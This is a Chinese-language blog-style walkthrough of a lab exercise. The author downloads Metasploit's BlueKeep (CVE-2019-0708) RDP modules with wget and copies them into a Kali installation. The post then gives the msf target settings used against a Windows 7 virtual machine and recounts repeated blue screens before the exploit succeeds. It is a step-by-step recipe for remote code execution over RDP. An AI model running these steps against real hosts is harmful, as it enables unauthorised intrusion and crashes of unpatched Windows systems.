首先下载github上的那四个rb文件

 

wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb

wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb

wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb

wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb

 

下载好了后，覆盖之前msf中的文件。一定要覆盖！不覆盖完全的话，exploit的时候会报错。这四个文件的是相互关联的，必须都得覆盖。

 

 

cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb

 

cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb

 

Cp cve_2019_0708_bluekeep.rb  /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb

 

Cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb

 

这是kali中的metasploit路径，如果是linux中自己安装的metasploit貌似路径为/opt/metasploit-framework/.....

 

 

整好了后，进入msf中reload_all，导入攻击脚本。

然后设置set rhost 地址

Set target 3

Vmware设置3

Vbox的设置2

 

之前的第一次弄的3，然后蓝屏了，蓝屏没用，准备第二次。

 

 

之后又把1234挨个设置了试，全都蓝屏，最后四个都试了几遍，还是不行。。。我tm，然后大佬们说最好把win7设置为2GB内存、两核。听说这样成功率高。额行吧，试试。

 

 

 

然后继续设置3，exploit试试，还是蓝屏，接着又试了124，都蓝屏。

 

最后哈我又再次试了3，ok bingo！！！！！！

 

 


后面继续试的时候，都是蓝屏一次，成功一次。。。。。。还挺有规律。
